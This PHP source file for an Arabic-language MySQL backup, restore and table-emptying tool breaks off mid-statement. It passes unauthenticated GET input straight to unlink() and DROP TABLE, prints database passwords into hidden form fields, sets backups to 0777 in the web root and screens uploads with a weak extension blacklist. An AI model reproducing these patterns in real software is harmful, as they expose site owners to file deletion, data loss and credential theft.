<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<?php
include ("../config.php");

$Grinuitch = time() + (3600 * 3); 

$date= date("H:i:s ", $Grinuitch);

#######################################################################
#                                  Snfoor3.4
#                               www.magtrb.com
#                   برنامج خاص بنسخ قواعد البيانات واسترجاعها
#                             22/05/06 18:49
#######################################################################
/*  اعط التصريح */
// backupdb  مجلد 777
          


// اسماء قواعد البيانات فيما لو كان هناك اكثر من قاعدة
// وترغب ان تستخدم البرنامج لنسخ هذه القواعد

$datapases = array("$my_database");

// اسماء المستخدمين للقواعد فيما لو كانوا اكثر من واحد
$usernames = array("$mysql_login");

// الارقام السرية
 $passwords = array ( "$mysql_password");
#
#  في حالة رغبتك اضافة قواعد اخرى او مستخدمين او ارقام سرية فقط ضع
# ,"xxxx"
# في اخر المصفوفه مثال
#$usernames = array("اسم المستخدم الاول","الثاني","الثالث","xxxx","yyyyy");
#######################################################################
#
#            ممنوع التغيير في السكربت بدون موافقة مغترب سوفت
#                            www.magtrb.com
#                     ويستثني من المنع الالوان والتصميم
#                                 Snfoor3.4
#                              22/05/06 18:50
######################## لا تكتب بعد هذا الخط #########################
######################## لا تكتب بعد هذا الخط #########################
######################## لا تكتب بعد هذا الخط #########################


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir=rtl>
<head>
<title>نسخ قاعة البيانات</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />

<style type="text/css">

FONT             {FONT-FAMILY: ms sans serif; FONT-SIZE: 12px}

P                {FONT-FAMILY: ms sans serif; FONT-SIZE: 14px}
DIV              {FONT-FAMILY: ms sans serif; FONT-SIZE: 14px}

td {
	border: 2px solid #7E3A9E;
	border-right: 2px solid #87529F;
	border-bottom: 2px solid #87529F;
	background-color: #E9DBF4;
	color: #3C0954;
	FONT-FAMILY: ms sans serif; FONT-SIZE: 14px
}
table {
	margin-left: auto;
	margin-right: auto;
}
form {
	padding: 0px;
	margin: 0px;
}
A:link       {color:#000000;
FONT-SIZE: 12px;
FONT-FAMILY: ms sans serif;text-decoration:none}
A:active     {color:#525293;
FONT-SIZE: 12px;
FONT-FAMILY: ms sans serif;text-decoration:none}
A:visited    {color:#525293;
FONT-SIZE: 12px;
FONT-FAMILY: ms sans serif;text-decoration:none}
A:hover      {color:#525293;
FONT-SIZE: 12px;
 FONT-FAMILY: ms sans serif;text-decoration:underline}
</style>

</head>

<body>


<?



$action = $_GET['action'];
if ($action=="droptables"){
$HOST ="localhost"; // يغير في حالة انه ليس كذلك
$NAME = $_GET['NAME'];
$USER = $_GET['USER'];
$PASS = $_GET['PASS'];
$ok = $_GET['ok'];

echo"<form method=\"GET\" action=\"$PHP_SELF?action=droptables\"><p dir=\"rtl\" align=\"center\">
  <span lang=\"ar-sa\">اسم القاعدة : </span><select size=\"1\" name=\"NAME\">";
   Magtrb($datapases);
 echo"</select> <span lang=\"ar-sa\">&nbsp; اسم المستخدم :</span>&nbsp;&nbsp;
  <select type='hidden' size=\"1\" name=\"USER\">";
   Magtrb($usernames);
 echo" </select><span lang=\"ar-sa\">&nbsp; الرقم السري : </span>&nbsp;&nbsp;
  <select size=\"1\" name=\"PASS\">";
   Magtrb($passwords);
 echo" </select><br>
<br>
  <input name=\"submit\" type=\"submit\" value=\"افراغ القاعدة\"></p>
  </form>";

if($NAME && $USER && $PASS){
if($ok){

if (!$error)
{ $dbcon = @mysql_connect($HOST,$USER,$PASS);
  if ($dbcon)
    $db = mysql_select_db($NAME);
  if (!$dbcon || !$db)
  { echo ("<p class=\"error\">لم يمكن الاتصال بالقاعدة".mysql_error()."</p>\n");
    echo ("<p>ارجوا تصحيح معلومات القاعدة ".$_SERVER["SCRIPT_FILENAME"]." او الاتصال بالمستظيف</p>\n");
    $error=true;
  }
}



$tables = mysql_list_tables($NAME);

if (is_resource($tables)) {
while (list($tablename) = mysql_fetch_array($tables)) {
echo"<div align=\"center\">";
echo $tablename;
echo"تم حذفه <br></div>";

$sql = "DROP TABLE $tablename";
mysql_query($sql) or die(mysql_error());
}

}else{

echo"<p align=\"center\"";
echo"قاعدة البيانات فارغة<br></p>";
}

}else{
echo"<br><p align=\"center\">هل انت متأكد تريد افراع قاعدة البيانات <b><font color=\"#FF0000\">$NAME</font></b> ";
echo"<br>افراغك للقاعدة سوف يقوم بحذف جميع الجدول التي فيها";
echo"<br></p><br>";
echo"<form method=\"GET\" action=\"$PHP_SELF?action=droptables&ok=1\">
		<p align=\"center\">
    <input type=\"hidden\" name=\"NAME\" value=\"$NAME\">
    <input type=\"hidden\" name=\"USER\" value=\"$USER\">
    <input type=\"hidden\" name=\"PASS\" value=\"$PASS\">
    	<input type=\"submit\" value=\"نعم متأكد\"></p>
</form><br>";

}
}else{


}
}



$DB_HOST =$mysql_host; // يغير في حالة انه ليس كذلك
$DB_NAME = $my_database;
$DB_USER = $mysql_login;
$DB_PASS =$mysql_password;



echo"<form method=\"GET\" action=\"$PHP_SELF?action=backup\"><p dir=\"rtl\" align=\"center\">
  <span lang=\"ar-sa\"> </span><select style='display:none' size=\"1\" name=\"DB_NAME\">";
   Magtrb($datapases);
 echo"</select> <span lang=\"ar-sa\"></span>&nbsp;&nbsp;
  <select style='display:none' size=\"1\" name=\"DB_USER\">";
   Magtrb($usernames);
 echo" </select><span lang=\"ar-sa\"> </span>&nbsp;&nbsp;
  <select style='display:none' size=\"1\" name=\"DB_PASS\">";
   Magtrb($passwords);
 echo" </select><br>
 <input type=\"hidden\" name=\"StartBackup\" value=\"complete\">
<br>
  <input name=\"submit\" type=\"submit\" value=\"نسخ القاعدة\"></p>
  </form>";


if ($_GET['delete']) {
	unlink ($_GET['delete']);
}
// النظام الجديد

define('backupDBversion', '1.1.32');   // from backupDB prgram


define('BACKTICKCHAR',    '`');
define('QUOTECHAR',       '\'');
define('LINE_TERMINATOR', "\n");  // \n = UNIX; \r\n = Windows; \r = Mac
define('BUFFER_SIZE',     32768); // in bytes
define('TABLES_PER_COL',  30);    //
define('STATS_INTERVAL',  500);   // number of records processed between each DHTML stats refresh

$GZ_enabled         = (bool) function_exists('gzopen');

$DHTMLenabled       = true;  // set $DHTMLenabled = FALSE to prevent JavaScript errors in incompatible browsers
                             // set $DHTMLenabled = TRUE to get the nice DHTML display in recent browsers

$dbNameInCreate     = false;  // if true: "CREATE TABLE `database`.`table`", if false: "CREATE TABLE `table`"

$CreateIfNotExists  = false; // if true: "CREATE TABLE IF NOT EXISTS `database`.`table`", if false: "CREATE TABLE `database`.`table`"

$ReplaceInto        = false; // if true: "REPLACE INTO ", if false: "INSERT INTO "

$HexBLOBs           = true;  // if true: blobs get data dumped as hex string; if false: blobs get data dumped as escaped binary string

$SuppressHTMLoutput = (@$_REQUEST['nohtml'] ? true : false); // disable all output for running as a cron job

$backuptimestamp    = '.'.date('Y-m-d'); // timestamp
if (!empty($_REQUEST['onlyDB'])) {
	$backuptimestamp = '.'.$_REQUEST['onlyDB'].$backuptimestamp;
}
//$backuptimestamp    = ''; // no timestamp
$backupabsolutepath = dirname(__FILE__).'/bhs/bhs/'; // make sure to include trailing slash
$fullbackupfilename = 'db_backup.sql'.($GZ_enabled ? '.gz' : '');
$tempbackupfilename = 'db_backup.temp.sql'.($GZ_enabled ? '.gz' : '');

$NeverBackupDBtypes = array('HEAP');



if (!function_exists('getmicrotime')) {
	function getmicrotime() {
		list($usec, $sec) = explode(' ', microtime());
		return ((float) $usec + (float) $sec);
	}
}

function FormattedTimeRemaining($seconds, $precision=1) {
	if ($seconds > 86400) {
		return number_format($seconds / 86400, $precision).' days';
	} elseif ($seconds > 3600) {
		return number_format($seconds / 3600, $precision).' hours';
	} elseif ($seconds > 60) {
		return number_format($seconds / 60, $precision).' minutes';
	}
	return number_format($seconds, $precision).' seconds';
}

function FileSizeNiceDisplay($filesize, $precision=2) {
	if ($filesize < 1000) {
		$sizeunit  = 'bytes';
		$precision = 0;
	} else {
		$filesize /= 1024;
		$sizeunit = 'kB';
	}
	if ($filesize >= 1000) {
		$filesize /= 1024;
		$sizeunit = 'MB';
	}
	if ($filesize >= 1000) {
		$filesize /= 1024;
		$sizeunit = 'GB';
	}
	return number_format($filesize, $precision).' '.$sizeunit;
}

function OutputInformation($id, $dhtml, $text='') {
	global $DHTMLenabled;
	if ($DHTMLenabled) {
		if (!is_null($dhtml)) {
			if ($id) {
				echo '<script>if (document.getElementById("'.$id.'")) document.getElementById("'.$id.'").innerHTML="'.$dhtml.'"</script>';
			} else {
				echo $dhtml;
			}
			flush();
		}
	} else {
		if ($text) {
			echo $text;
			flush();
		}
	}
	return true;
}
if (isset($_REQUEST['StartBackup'])) {
if (!@mysql_connect($DB_HOST, $DB_USER, $DB_PASS)) {
	die('There was a problem connecting to the database:<br>'."\n".mysql_error());
}
}
if (!is_dir($backupabsolutepath)) {
	die('"'.htmlentities($backupabsolutepath).'" is not a directory');
} elseif (!is_writable($backupabsolutepath)) {
	die('"'.htmlentities($backupabsolutepath).'" is not writable');
}

if ($SuppressHTMLoutput) {
	ob_start();
}

echo '<div align="center"><h4>نسخ قاعدة البيانات</h4>';

$dbname = $DB_NAME;


if (isset($_REQUEST['StartBackup'])) {

	if (($GZ_enabled && ($zp = @gzopen($backupabsolutepath.$tempbackupfilename, 'wb'))) ||
		(!$GZ_enabled && ($fp = @fopen($backupabsolutepath.$tempbackupfilename, 'wb')))) {

		$fileheaderline  = '# Snfoor 3.4  (http://www.magtrb.com)'.LINE_TERMINATOR;
		$fileheaderline .= '# mySQL backup ('.date('F j, Y g:i a').')   Type = ';
		if ($GZ_enabled) {
			gzwrite($zp, $fileheaderline, strlen($fileheaderline));
		} else {
			fwrite($fp, $fileheaderline, strlen($fileheaderline));
		}


			if ($GZ_enabled) {
				gzwrite($zp, 'Complete'.LINE_TERMINATOR.LINE_TERMINATOR, strlen('Complete'.LINE_TERMINATOR.LINE_TERMINATOR));
			} else {
				fwrite($fp, 'Complete'.LINE_TERMINATOR.LINE_TERMINATOR, strlen('Complete'.LINE_TERMINATOR.LINE_TERMINATOR));
			}
			$backuptype = 'full';
			unset($SelectedTables);


				@set_time_limit(60);
				$tables = mysql_list_tables($dbname);
				if (is_resource($tables)) {
					$tablecounter = 0;
					while (list($tablename) = mysql_fetch_array($tables)) {
						$TableStatusResult = mysql_query('SHOW TABLE STATUS LIKE "'.mysql_escape_string($tablename).'"');
						if ($TableStatusRow = mysql_fetch_array($TableStatusResult)) {
							if (in_array($TableStatusRow['Type'], $NeverBackupDBtypes)) {

								// no need to back up HEAP tables, and will generate errors if you try to optimize/repair

							} else {

								$SelectedTables[$dbname][] = $tablename;

							}
						}
					}
				}




		$starttime = getmicrotime();
		OutputInformation('', null, 'Checking tables...<br><br>');
		$TableErrors = array();
		foreach ($SelectedTables as $dbname => $selectedtablesarray) {
			mysql_select_db($dbname);
			$repairresult = '';
			$CanContinue = true;
			foreach ($selectedtablesarray as $selectedtablename) {
				OutputInformation('statusinfo', 'Checking table <b>'.$dbname.'.'.$selectedtablename.'</b>');
				$result = mysql_query('CHECK TABLE '.$selectedtablename);
				while ($row = mysql_fetch_array($result)) {
					@set_time_limit(60);
					if ($row['Msg_text'] == 'OK') {

						mysql_query('OPTIMIZE TABLE '.$selectedtablename);

					} else {

						OutputInformation('statusinfo', 'Repairing table <b>'.$selectedtablename.'</b>');
						$repairresult .= 'REPAIR TABLE '.$selectedtablename.' EXTENDED'."\n\n";
						$fixresult = mysql_query('REPAIR TABLE '.$selectedtablename.' EXTENDED');
						$ThisCanContinue = false;
						while ($fixrow = mysql_fetch_array($fixresult)) {
							$thisMessage = $fixrow['Msg_type'].': '.$fixrow['Msg_text'];
							$repairresult .= $thisMessage."\n";
							switch ($thisMessage) {
								case 'status: OK':
								case 'error: The handler for the table doesn\'t support repair':
								case 'note: The storage engine for the table doesn\'t support repair':

									$ThisCanContinue = true;
									break;
							}
						}
						if (!$ThisCanContinue) {
							$CanContinue = false;
						}

						$repairresult .= "\n\n".str_repeat('-', 60)."\n\n";

					}
				}
			}

			if (!empty($repairresult)) {
				mail(ADMIN_EMAIL, 'bhs: MySQL Table Error Report', $repairresult);
				echo '<pre>'.$repairresult.'</pre>';
				if (!$CanContinue) {
					if ($SuppressHTMLoutput) {
						ob_end_clean();
						echo 'errors';
					}
					exit;
				}
			}
		}
		OutputInformation('statusinfo', '');

		OutputInformation('', '<br><b><span id="topprogress">تم نسخ القاعدة:</span></b><br>');
		$overallrows = 0;
		foreach ($SelectedTables as $dbname => $value) {
			mysql_select_db($dbname);
		//	echo '<table border="1"><tr><td colspan="'.ceil(count($SelectedTables[$dbname]) / TABLES_PER_COL).'"><b>'.$dbname.'</b></td></tr><tr><td nowrap valign="top">';
			$tablecounter = 0;
			for ($t = 0; $t < count($SelectedTables[$dbname]); $t++) {
				if ($tablecounter++ >= TABLES_PER_COL) {
		//			echo '</td><td nowrap valign="top">';
					$tablecounter = 1;
				}
				$SQLquery = 'SELECT COUNT(*) AS num FROM '.$SelectedTables[$dbname][$t];
				$result = mysql_query($SQLquery);
				$row = mysql_fetch_array($result);
				$rows[$t] = $row['num'];
				$overallrows += $rows[$t];
			//	echo '<span id="rows_'.$dbname.'_'.$SelectedTables[$dbname][$t].'">'.$SelectedTables[$dbname][$t].' ('.number_format($rows[$t]).' records)</span><br>';
			}
		//	echo '</td></tr></table><br>';
		}

		$alltablesstructure = '';
		foreach ($SelectedTables as $dbname => $value) {
			mysql_select_db($dbname);
			for ($t = 0; $t < count($SelectedTables[$dbname]); $t++) {
				@set_time_limit(60);
				OutputInformation('statusinfo', 'Creating structure for <b>'.$dbname.'.'.$SelectedTables[$dbname][$t].'</b>');

				$fieldnames     = array();
				$structurelines = array();
				$result = mysql_query('SHOW FIELDS FROM '.BACKTICKCHAR.$SelectedTables[$dbname][$t].BACKTICKCHAR);
				while ($row = mysql_fetch_array($result)) {
					$structureline  = BACKTICKCHAR.$row['Field'].BACKTICKCHAR;
					$structureline .= ' '.$row['Type'];
					$structureline .= ' '.($row['Null'] ? '' : 'NOT ').'NULL';
					eregi('^[a-z]+', $row['Type'], $matches);
					$RowTypes[$dbname][$SelectedTables[$dbname][$t]][$row['Field']] = $matches[0];
					if (@$row['Default']) {
						if (eregi('^(tiny|medium|long)?(text|blob)', $row['Type'])) {
							// no default values
						} else {
							$structureline .= ' default \''.$row['Default'].'\'';
						}
					}
					$structureline .= ($row['Extra'] ? ' '.$row['Extra'] : '');
					$structurelines[] = $structureline;

					$fieldnames[] = $row['Field'];
				}
				mysql_free_result($result);

				$tablekeys    = array();
				$uniquekeys   = array();
				$fulltextkeys = array();
				$result = mysql_query('SHOW KEYS FROM '.BACKTICKCHAR.$SelectedTables[$dbname][$t].BACKTICKCHAR);
				while ($row = mysql_fetch_array($result)) {
					$uniquekeys[$row['Key_name']]   = (bool) ($row['Non_unique'] == 0);
					if (isset($row['Index_type'])) {
						$fulltextkeys[$row['Key_name']] = (bool) ($row['Index_type'] == 'FULLTEXT');
					} elseif (@$row['Comment'] == 'FULLTEXT') {
						$fulltextkeys[$row['Key_name']] = true;
					} else {
						$fulltextkeys[$row['Key_name']] = false;
					}
					$tablekeys[$row['Key_name']][$row['Seq_in_index']] = $row['Column_name'];
					ksort($tablekeys[$row['Key_name']]);
				}
				mysql_free_result($result);
				foreach ($tablekeys as $keyname => $keyfieldnames) {
					$structureline  = '';
					if ($keyname == 'PRIMARY') {
						$structureline .= 'PRIMARY KEY';
					} else {
						if ($fulltextkeys[$keyname]) {
							$structureline .= 'FULLTEXT ';
						} elseif ($uniquekeys[$keyname]) {
							$structureline .= 'UNIQUE ';
						}
						$structureline .= 'KEY '.BACKTICKCHAR.$keyname.BACKTICKCHAR;
					}
					$structureline .= ' ('.BACKTICKCHAR.implode(BACKTICKCHAR.','.BACKTICKCHAR, $keyfieldnames).BACKTICKCHAR.')';
					$structurelines[] = $structureline;
				}


				$TableStatusResult = mysql_query('SHOW TABLE STATUS LIKE "'.mysql_escape_string($SelectedTables[$dbname][$t]).'"');
				if (!($TableStatusRow = mysql_fetch_array($TableStatusResult))) {
					die('failed to execute "SHOW TABLE STATUS" on '.$dbname.'.'.$tablename);
				}

				$tablestructure  = 'CREATE TABLE '.($CreateIfNotExists ? 'IF NOT EXISTS ' : '').($dbNameInCreate ? BACKTICKCHAR.$dbname.BACKTICKCHAR.'.' : '').BACKTICKCHAR.$SelectedTables[$dbname][$t].BACKTICKCHAR.' ('.LINE_TERMINATOR;
				$tablestructure .= '  '.implode(','.LINE_TERMINATOR.'  ', $structurelines).LINE_TERMINATOR;
				$tablestructure .= ') TYPE='.(@$TableStatusRow['Engine'] ? $TableStatusRow['Engine'] : $TableStatusRow['Type']); // MySQL 4.and higher, the 'Type' of database is now 'Engine' <thanks Philippe Soussan>
				if ($TableStatusRow['Auto_increment'] !== null) {
					$tablestructure .= ' AUTO_INCREMENT='.$TableStatusRow['Auto_increment'];
				}
				$tablestructure .= ';'.LINE_TERMINATOR.LINE_TERMINATOR;

				$alltablesstructure .= str_replace(' ,', ',', $tablestructure);

			} // end table structure backup
		}
		if ($GZ_enabled) {
			gzwrite($zp, $alltablesstructure.LINE_TERMINATOR, strlen($alltablesstructure) + strlen(LINE_TERMINATOR));
		} else {
			fwrite($fp, $alltablesstructure.LINE_TERMINATOR, strlen($alltablesstructure) + strlen(LINE_TERMINATOR));
		}

		OutputInformation('statusinfo', '');
		if ($_REQUEST['StartBackup'] != 'structure') {
			$processedrows    = 0;
			foreach ($SelectedTables as $dbname => $value) {
				@set_time_limit(60);
				mysql_select_db($dbname);
				for ($t = 0; $t < count($SelectedTables[$dbname]); $t++) {
					$result = mysql_query('SELECT * FROM '.$SelectedTables[$dbname][$t]);
					$rows[$t] = mysql_num_rows($result);
					if ($rows[$t] > 0) {
						$tabledatadumpline = '# dumping data for '.$dbname.'.'.$SelectedTables[$dbname][$t].LINE_TERMINATOR;
						if ($GZ_enabled) {
							gzwrite($zp, $tabledatadumpline, strlen($tabledatadumpline));
						} else {
							fwrite($fp, $tabledatadumpline, strlen($tabledatadumpline));
						}
					}
					unset($fieldnames);
					for ($i = 0; $i < mysql_num_fields($result); $i++) {
						$fieldnames[] = mysql_field_name($result, $i);
					}
					if ($_REQUEST['StartBackup'] == 'complete') {
						$insertstatement = ($ReplaceInto ? 'REPLACE' : 'INSERT').' INTO '.BACKTICKCHAR.$SelectedTables[$dbname][$t].BACKTICKCHAR.' ('.BACKTICKCHAR.implode(BACKTICKCHAR.', '.BACKTICKCHAR, $fieldnames).BACKTICKCHAR.') VALUES (';
					} else {
						$insertstatement = ($ReplaceInto ? 'REPLACE' : 'INSERT').' INTO '.BACKTICKCHAR.$SelectedTables[$dbname][$t].BACKTICKCHAR.' VALUES (';
					}
					$currentrow       = 0;
					$thistableinserts = '';
					while ($row = mysql_fetch_array($result)) {
						unset($valuevalues);
						foreach ($fieldnames as $key => $val) {
							if ($row[$key] === null) {

								$valuevalues[] = 'NULL';

							} else {

								switch ($RowTypes[$dbname][$SelectedTables[$dbname][$t]][$val]) {
									// binary data dump, two hex characters per byte
									case 'tinyblob':
									case 'blob':
									case 'mediumblob':
									case 'longblob':
										$data = $row[$key];
										$data_len = strlen($data);
										if ($HexBLOBs && $data_len) {
											$hexstring = '0x';
											for ($i = 0; $i < $data_len; $i++) {
												$hexstring .= str_pad(dechex(ord($data{$i})), 2, '0', STR_PAD_LEFT);
											}
											$valuevalues[] = $hexstring;
										} else {
											$valuevalues[] = QUOTECHAR.mysql_escape_string($data).QUOTECHAR;
										}
										break;

									// just the (numeric) value, not surrounded by quotes
									case 'tinyint':
									case 'smallint':
									case 'mediumint':
									case 'int':
									case 'bigint':
									case 'float':
									case 'double':
									case 'decimal':
									case 'year':
										$valuevalues[] = mysql_escape_string($row[$key]);
										break;

									// value surrounded by quotes
									case 'varchar':
									case 'char':
									case 'tinytext':
									case 'text':
									case 'mediumtext':
									case 'longtext':
									case 'enum':
									case 'set':
									case 'date':
									case 'datetime':
									case 'time':
									case 'timestamp':
									default:
										$valuevalues[] = QUOTECHAR.mysql_escape_string($row[$key]).QUOTECHAR;
										break;
								}

							}
						}
						$thistableinserts .= $insertstatement.implode(', ', $valuevalues).');'.LINE_TERMINATOR;

						if (strlen($thistableinserts) >= BUFFER_SIZE) {
							if ($GZ_enabled) {
								gzwrite($zp, $thistableinserts, strlen($thistableinserts));
							} else {
								fwrite($fp, $thistableinserts, strlen($thistableinserts));
							}
							$thistableinserts = '';
						}
						if ((++$currentrow % STATS_INTERVAL) == 0) {
							@set_time_limit(60);
							if ($DHTMLenabled) {
								OutputInformation('rows_'.$dbname.'_'.$SelectedTables[$dbname][$t], '<b>'.$SelectedTables[$dbname][$t].' ('.number_format($rows[$t]).' records, ['.number_format(($currentrow / $rows[$t])*100).'%])</b>');
								$elapsedtime = getmicrotime() - $starttime;
								$percentprocessed = ($processedrows + $currentrow) / $overallrows;
								$overallprogress = 'Overall Progress: '.number_format($processedrows + $currentrow).' / '.number_format($overallrows).' ('.number_format($percentprocessed * 100, 1).'% done) ['.FormattedTimeRemaining($elapsedtime).' elapsed';
								if (($percentprocessed > 0) && ($percentprocessed < 1)) {
									$overallprogress .= ', '.FormattedTimeRemaining(abs($elapsedtime - ($elapsedtime / $percentprocessed))).' remaining';
								}
								$overallprogress .= ']';
								OutputInformation('topprogress', $overallprogress);
							}
						}
					}
					if ($DHTMLenabled) {
						OutputInformation('rows_'.$dbname.'_'.$SelectedTables[$dbname][$t], $SelectedTables[$dbname][$t].' ('.number_format($rows[$t]).' records, [100%])');
						$processedrows += $rows[$t];
					}
					if ($GZ_enabled) {
						gzwrite($zp, $thistableinserts.LINE_TERMINATOR.LINE_TERMINATOR, strlen($thistableinserts) + strlen(LINE_TERMINATOR) + strlen(LINE_TERMINATOR));
					} else {
						fwrite($fp, $thistableinserts.LINE_TERMINATOR.LINE_TERMINATOR, strlen($thistableinserts) + strlen(LINE_TERMINATOR) + strlen(LINE_TERMINATOR));
					}
				}
			}
		}
		if ($GZ_enabled) {
			gzclose($zp);
		} else {
			fclose($fp);
		}

	if ($backuptype == 'full') {
			$newfullfilename = $backupabsolutepath.$fullbackupfilename;
		} else {
			$newfullfilename = $backupabsolutepath.$partbackupfilename;
		}

		if (file_exists($newfullfilename)) {
			unlink($newfullfilename); // Windows won't allow overwriting via rename
		}
		rename($backupabsolutepath.$tempbackupfilename, $newfullfilename);
		if (strtoupper(substr(PHP_OS, 0, 3)) != 'WIN') {
			touch($newfullfilename);
			if (!chmod($newfullfilename, 0777)) {
				mail(ADMIN_EMAIL, 'bhs: Failed to chmod()', 'Failed to chmod('.$newfullfilename.', 0777)');
			}
		}



		echo '<br>Backup complete in '.FormattedTimeRemaining(getmicrotime() - $starttime, 2).'.<br>';
		echo '<a href="'.str_replace(@$_SERVER['DOCUMENT_ROOT'], '', $backupabsolutepath).basename($newfullfilename).'"><b>'.basename($newfullfilename).'</b> ('.FileSizeNiceDisplay(filesize($newfullfilename), 2);
		echo ')</a><br>';

		OutputInformation('cancellink', '');

	} else {

		echo '<b>Warning:</b> failed to open '.$backupabsolutepath.$tempbackupfilename.' for writing!<br><br>';
		if (is_dir($backupabsolutepath)) {
			echo '<i>CHMOD 777</i> on the directory ('.htmlentities($backupabsolutepath).') should fix that.';
		} else {
			echo 'The specified directory does not exist: "'.htmlentities($backupabsolutepath).'"';
		}

	}

} else {  // !$_REQUEST['StartBackup']

	if (file_exists($backupabsolutepath.$fullbackupfilename)) {
		echo 'الوقت الان '.gmdate('F j, Y g:ia T', time() + date('Z')).'<br>';
		echo 'اخر عملية نسخ كانت في: ';
		$lastbackuptime = filemtime($backupabsolutepath.$fullbackupfilename);
		echo gmdate('F j, Y g:ia T', $lastbackuptime + date('Z'));
		echo '<br><b>'.FormattedTimeRemaining(time() - $lastbackuptime).'</b> مضت<br>';
		if ((time() - $lastbackuptime) < 86400) {
			
		}
		echo '<br><a href="'.str_replace(@$_SERVER['DOCUMENT_ROOT'], '', $backupabsolutepath).$fullbackupfilename.'">حمل اخر ملف قاعدة تم نسخه ('.FileSizeNiceDisplay(filesize($backupabsolutepath.$fullbackupfilename), 2).')</a> (اضغط يمين بالفاره ثم حفظ بأسم)<br><br>';
	} else {
		echo 'اخر عملية نسخ للقاعدة: <i>غير معروفة</i>'.($backuptimestamp ? ' ' : '').'<br>';
	}


}


if ($SuppressHTMLoutput) {
	ob_end_clean();
	echo 'done';
}
echo"</div>";
//*********************************************** نهاية النظام الجديد
$root_dir="bhs/";
if ($dir = @opendir("./bhs/")) {
	while (($file = readdir($dir)) !== false) {
		if ($file != ".." && $file != "." && $file !== $this_script && $file{0} !== ".") {
			$filelist[] = $file;
		}
	}
	closedir($dir);
}

if ($filelist) {
	arsort($filelist);

	echo "<table cellpadding=\"4\" cellspacing=\"1\">\n";
	
}
?>

<br />


<?


if ($action=="dump"){
//**************************************************************************

$NunLines = 1500;

if($_GET["dbusername"]){
$dbusername = $_GET["dbusername"];  }else {
      if($_SESSION['dbusername']){
      $dbusername = $_SESSION['dbusername'];}else{
      $dbusername ="username";}
       }
if($_GET["dbpassword"]){
$dbpassword = $_GET["dbpassword"]; } else {
      if($_SESSION['dbpassword']){
      $dbpassword = $_SESSION['dbpassword'];}else{
      $dbpassword ="password";}
       }
if($_GET["dbdatabase"]){
$dbdatabase = $_GET["dbdatabase"]; } else {
      if($_SESSION['dbdatabase']){
      $dbdatabase = $_SESSION['dbdatabase'];}else{
      $dbdatabase ="database";}
       }
if($_GET["linespersession"]){
$linespersession = $_GET["linespersession"]; } else {
      if($_SESSION['linespersession']){
      $linespersession = $_SESSION['linespersession'];}else{
      $linespersession =$NunLines;}
       }


$_SESSION['dbusername'] = $dbusername;
$_SESSION['dbpassword'] = $dbpassword;
$_SESSION['dbdatabase'] = $dbdatabase;
$_SESSION['linespersession'] = $linespersession;


echo "<p align=\"center\">اكتب معلومات القاعدة التي ترغب بسترجاع المعلومات اليها</p>\n";
echo "<form action=\"$PHP_SELF?action=dump\" method=\"GET\">
    <p dir=\"ltr\" align=\"center\">
  <span lang=\"ar-sa\"> </span><select style='display:none' size=\"1\"dir=\"ltr\" value=\"$dbdatabase\"  name=\"dbdatabase\">";
   Magtrb($datapases);
 echo"</select> <span lang=\"ar-sa\"></span>&nbsp;&nbsp;
  <select style='display:none' size=\"1\" dir=\"ltr\" value=\"$dbusername\" name=\"dbusername\">";
   Magtrb($usernames);
 echo" </select><span lang=\"ar-sa\"></span>&nbsp;&nbsp;
  <select style='display:none' size=\"1\" dir=\"ltr\" value=\"$dbpassword\" name=\"dbpassword\">";
   Magtrb($passwords);
 echo" </select><br> <span lang=\"ar-sa\">&nbsp; سطر بكل عملية :</span>&nbsp;&nbsp;
  <input name=\"linespersession\" size=\"4\" dir=\"ltr\" value=\"$linespersession\"><br><br>
  <input name=\"submit\" type=\"submit\" value=\"عرض القواعد\"></p>
  </form><br />";


IF ($dbdatabase =="database" || $dbpassword =="password"){exit;}
IF (!$dbdatabase || !$dbpassword){exit;}
$db_server  = "localhost";
$filename  = "";
$delaypersession = 0;
$comment[0]="#";
$comment[1]="-- ";


@define ("VERSION","Snfoor3.4");
@define ("MAX_LINE_LENGTH",65536);

@ini_set("auto_detect_line_endings", true);

@header("Expires: Mon, 1 Dec 2003 01:00:00 GMT");
@header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
@header("Cache-Control: no-store, no-cache, must-revalidate");
@header("Cache-Control: GET-check=0, pre-check=0", false);
@header("Pragma: no-cache");

?>

<table width="780" cellspacing="0" cellpadding="0">
<tr><td class="transparent">

<?

$error = false;
$file  = false;


if (!$error && !function_exists("version_compare"))
{ echo ("<p class=\"error\">PHP version 4.1.0 is required for BigDump to proceed. You have PHP ".phpversion()." installed. Sorry!</p>\n");
  $error=true;
}

// Calculate PHP max upload size (handle settings like 10M or 100K)

if (!$error)
{ $upload_max_filesize=ini_get("upload_max_filesize");
  if (eregi("([0-9]+)K",$upload_max_filesize,$tempregs)) $upload_max_filesize=$tempregs[1]*1024;
  if (eregi("([0-9]+)M",$upload_max_filesize,$tempregs)) $upload_max_filesize=$tempregs[1]*1024*1024;
  if (eregi("([0-9]+)G",$upload_max_filesize,$tempregs)) $upload_max_filesize=$tempregs[1]*1024*1024*1024;
}

// Handle file upload

$upload_dir=dirname($_SERVER["SCRIPT_FILENAME"]);
$upload_dir = "$upload_dir/bhs";
if (!$error && isset($_REQUEST["uploadbutton"]))
{ if (is_uploaded_file($_FILES["dumpfile"]["tmp_name"]) && ($_FILES["dumpfile"]["error"])==0)
  {
    $uploaded_filename=str_replace(" ","_",$_FILES["dumpfile"]["name"]);
    $uploaded_filepath=str_replace("\\","/",$upload_dir."/".$uploaded_filename);

    if (file_exists($uploaded_filename))
    { echo ("<p class=\"error\">الملف $uploaded_filename موجود مسبقاً الرجاء حذفه والمحاولة مره اخرى</p>\n");
    }
    else if (eregi("(\.php|\.php3|\.php4|\.php5)$",$uploaded_filename))
    { echo ("<p class=\"error\">تحميل الامتدادات هذه غير مسموح</p>\n");
    }
    else if (!@move_uploaded_file($_FILES["dumpfile"]["tmp_name"],$uploaded_filepath))
    { echo ("<p class=\"error\">Error moving uploaded file ".$_FILES["dumpfile"]["tmp_name"]." to the $uploaded_filepath</p>\n");
      echo ("<p>تأكد ان الملف $upload_dir معطى التصريح 777</p>\n");
    }
    else
